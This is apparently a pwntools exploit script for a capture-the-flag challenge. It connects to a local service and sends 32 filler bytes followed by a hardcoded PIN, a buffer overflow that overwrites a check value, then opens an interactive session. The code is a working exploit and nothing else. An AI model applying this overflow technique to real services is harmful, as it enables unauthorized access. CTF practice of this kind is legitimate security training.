from pwn import *

# p = process('./capture-the-flag')
p = remote('localhost', 7904)

PIN = "512524"

offset = 32
payload = b'A' * offset + PIN.encode()

p.sendline(b'exit')
p.sendline(payload)
p.interactive()